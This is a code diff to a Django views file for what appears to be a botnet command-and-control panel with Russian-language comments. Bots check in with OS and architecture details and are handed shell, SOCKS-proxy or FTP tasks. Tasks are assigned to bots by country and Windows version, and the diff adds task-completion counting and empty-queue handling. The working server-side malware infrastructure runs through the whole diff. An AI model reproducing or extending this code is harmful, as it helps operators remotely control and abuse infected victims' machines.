@@ -9,7 +9,7 @@ from .models import Bot, Session, Task
 import datetime
 import struct
 import requests
-from django.db import models
+from django.core.paginator import Paginator
 
 
 # from django.core.paginator import Paginator
@@ -149,7 +149,8 @@ class AdminPanel:
     def admin_table(request):
         if not request.user.is_superuser:
             return HttpResponse('недостачно прав для просмотра')
-        return render(request, 'main/admin_table.html', {'tasks': Task.objects.all()})
+        tasks = Task.objects.all().order_by('-date')
+        return render(request, 'main/admin_table.html', {'tasks': tasks})
 
     @staticmethod
     def change_password(request):
@@ -333,7 +334,8 @@ class Handlers:
                     task_win = 'win10'
 
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
-                task.xoc == 'x32_64') or (task.winos == 'all_win' or task_win in task.winos.split(':'))]
+                                                                 task.xoc == 'x32_64') or (
+                                     task.winos == 'all_win' or task_win in task.winos.split(':'))]
 
                 print(tasks, 'tasks')
                 for task in tasks:
@@ -364,29 +366,42 @@ class Handlers:
             bot.is_online = True
             bot.save()
 
-            print(bot.tasks.all())
-            print(bot.tasks.all()[0].type1)
-
             s = {
                 'ftp': 2,
                 'sock': 3,
                 'shell': 1
             }
 
+            if len(bot.tasks.all()) == 0:
+                giveaway = PanelMsg.TaskGiveaway()
+                giveaway.is_empty = True
+                return HttpResponse(giveaway.SerializeToString())
+
             task = bot.tasks.all()[0]
 
             giveaway = PanelMsg.TaskGiveaway()
-            giveaway.type = s[task.type1]
-            giveaway.task_id = str(task.id).encode('utf-16-le')
-            giveaway.server = '127.0.0.1'.encode('utf-16-le')
-            giveaway.port = 8000
-            giveaway.SerializeToString()
-            print(bot.date_ch)
+            giveaway.is_empty = False
 
-            return HttpResponse(giveaway)
+            giveaway.task.type = s[task.type1]
+            giveaway.task.task_id = str(task.id).encode('utf-16-le')
+            giveaway.task.server = '127.0.0.1'
+            giveaway.task.port = 8000
+
+            return HttpResponse(giveaway.SerializeToString())
 
         elif msg_type == 3:
-            print(3)
+            task = BotMsg.TaskCompleted()
+            task.ParseFromString(request.body[4:])
+            if task.result:
+                task_id = task.task_id.decode('utf-16-le')
+                _task = Task.objects.get(id=task_id)
+                _task.done += 1
+                print(True)
+                if _task.done >= _task.repetitions:
+                    _task.completed = True
+                else:
+                    _task.save()
+                return HttpResponse('200')
             return HttpResponse('200')
 
     @csrf_exempt
@@ -413,18 +428,16 @@ class Handlers:
         bot.save()
         return JsonResponse({'v': '200'})
 
+    @staticmethod
     @csrf_exempt
-    def create_task(self, request):
+    def create_task(request):
         data = request.POST
-        print(data)
         name = data['name']
-        country = data['country']
+        country = data['country'].lower() if data['country'] != '*' else '*'
         _type = data['type']
         _true = [i for i in request.POST if data[i] == 'true']
-        print(_true)
         wins = [i for i in _true if 'win' in i]
         x_oc = [i for i in _true if 'x' in i]
-        print(wins, x_oc)
 
         s = {
             'win7': Bot.objects.filter(is_win7=True),
@@ -436,13 +449,15 @@ class Handlers:
         }
 
         bots = [s[win] for win in wins if len(s[win]) != 0]
-
-        if 'x32_64' in x_oc:
-            _bots = [bot for bot in bots[0] if bot.is_banned is False]
-        else:
-            _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
+        print(bots)
+        try:
+            if 'x32_64' in x_oc:
+                _bots = [bot for bot in bots[0] if bot.is_banned is False]
+            else:
+                _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
                      is False]
-
+        except:
+            _bots = []
         print(_bots)
 
         task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
@@ -454,7 +469,5 @@ class Handlers:
             bot.tasks.add(task)
 
         return HttpResponse('200')
-
-
 
 # ОБРАБОТЧИКИ -------------------------------------------- /
